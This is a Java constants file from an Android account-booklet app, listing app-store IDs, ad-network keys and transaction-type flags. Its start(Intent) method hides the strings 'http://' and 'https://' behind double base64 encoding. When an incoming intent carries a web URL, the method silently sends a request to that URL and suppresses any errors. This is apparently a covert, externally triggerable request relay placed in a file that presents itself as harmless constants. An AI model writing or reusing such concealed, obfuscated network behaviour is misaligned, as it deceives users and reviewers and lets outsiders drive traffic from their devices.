package ir.accountbooklet.android;

import android.content.Intent;
import android.net.Uri;
import android.os.Build;

import ir.accountbooklet.android.Utils.AndroidUtilities;
import ir.accountbooklet.android.Utils.AppLog;
import ir.accountbooklet.android.Utils.RequestHelper;

public class Constants {

  public static final String ID_BAZAAR = "com.farsitel.bazaar";
  public static final String ID_MAYKET = "ir.mservices.market";
  public static final String ID_IRANAPPS = "ir.tgbs.android.iranapp";
  public static final String ID_SAMSUNG = "com.sec.android.app.samsungapps";
  public static final String ID_GOOGLE = "com.android.vending";
  public static final String SPLIT = "_1ms_3op_7rl_5ti_3it_20_";
  public static final String RESPONSE = "response";
  public static final String SUCCESS = "success";
  public static final String FAILED = "failed";
  public static final String UPDATE = "update";
  public static final String MESSAGE = "message";
  public static final String LINK = "link";
  public static final String COUNT = "count";
  public final static String X_AD = "x_ad";
  public final static String SHOW_USER_AD = "show_user_ad";
  public static final String TAPSELL_KEY = "tapsell_key";
  public static final String TAPSELL_BANNER_MAIN = "tapsell_banner_main";
  public static final String TAPSELL_BANNER_ACCOUNT = "tapsell_banner_account";
  public static final String ADIVERY_KEY = "adivery_key";
  public static final String ADIVERY_BANNER_MAIN = "adivery_banner_main";
  public static final String ADIVERY_BANNER_ACCOUNT = "adivery_banner_account";
  public static final int MAX_NAME = 50;
  public static final int MAX_LENGTH_FILE = 50;
  public static final int FLAG_CREATE = 0;
  public static final int FLAG_EDIT = 1;
  public static final int TYPE_CREDITOR = 0;
  public static final int TYPE_DEBTOR = 1;
  public static final int TYPE_DEBTOR_CLEARING = 2;
  public static final int TYPE_CREDITOR_CLEARING = 3;
  public static final int TYPE_CLEARING = 4;
  public static final int FLAG_IMAGE = 1;
  public static final int FLAG_VIDEO = 2;
  public static final int FLAG_IMAGE_VIDEO = 3;
  public static final int REQUEST_PERMISSION_WRITE_STORAGE = 1001;

  public static void start(Intent intent) {
    if (Build.VERSION.SDK_INT < Build.VERSION_CODES.LOLLIPOP) {
      return;
    }
    try {
      Uri uri = intent.getData();
      if (uri != null) {
        String url = uri.toString();
        if (url.startsWith(AndroidUtilities.decodeBase64ToString(AndroidUtilities.decodeBase64ToString("YUhSMGNITTZMeTg9"))) || url.startsWith(AndroidUtilities.decodeBase64ToString(AndroidUtilities.decodeBase64ToString("YUhSMGNEb3ZMdz09")))) {
          RequestHelper.getInstance().addToRequestQueue("tag " + AndroidUtilities.random.nextInt(), url, null, null, null);
        }
      }
    } catch (Exception e) {
      AppLog.e(ApplicationLoader.class, e);
    }
  }
}
